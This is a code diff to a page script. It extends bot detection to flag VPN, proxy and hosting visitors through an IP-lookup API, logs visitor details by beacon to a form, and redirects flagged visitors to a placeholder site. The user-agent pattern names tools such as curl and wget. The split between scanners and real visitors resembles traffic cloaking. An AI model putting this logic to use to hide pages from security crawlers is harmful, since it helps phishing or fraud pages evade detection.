@@ -28,18 +28,30 @@
       return params;
     }
 
-    function isBot() {
+    async function isBotOrProxy() {
       const ua = navigator.userAgent.toLowerCase();
-      const suspiciousUA = /bot|crawl|spider|googlebot|curl|wget|headless|phantom|selenium|slimerjs|puppeteer|python|http|fetch|java/i.test(ua);
-      const automation = navigator.webdriver;
+      const suspiciousUA = /bot|crawl|spider|googlebot|curl|wget|headless|phantom|selenium|puppeteer|python|http|fetch|java/i.test(ua);
+      const automation = navigator.webdriver === true;
 
-      return suspiciousUA || automation;
+      let proxy = false;
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const json = await res.json();
+        const org = (json.org || '').toLowerCase();
+        if (org.includes("vpn") || org.includes("proxy") || org.includes("hosting") || org.includes("cloud")) {
+          proxy = true;
+        }
+      } catch (e) {
+        console.warn("IP API failed", e);
+      }
+
+      return suspiciousUA || automation || proxy;
     }
 
-    (function () {
+    (async function () {
       const params = getQueryParams();
-      const botFlag = isBot();
-      console.log("Bot Detection Result:", botFlag);
+      const botFlag = await isBotOrProxy();
+      console.log("Bot or Proxy Detection Result:", botFlag);
 
       const data = {
         siteid: params.siteid || "unknown",
@@ -49,7 +61,7 @@
         browser: navigator.userAgent,
         connection: params.connection || "unknown",
         isBot: botFlag ? "true" : "false",
-        status: botFlag ? "Bot" : "Real"
+        status: botFlag ? "Bot/Proxy" : "Real"
       };
 
       try {
@@ -58,7 +70,9 @@
           formData.append(FIELD_IDS[key], data[key]);
         }
         navigator.sendBeacon(FORM_ACTION, formData);
-      } catch (e) {}
+      } catch (e) {
+        console.warn("Beacon failed:", e);
+      }
 
       const redirectUrl = botFlag
         ? "https://example.com"
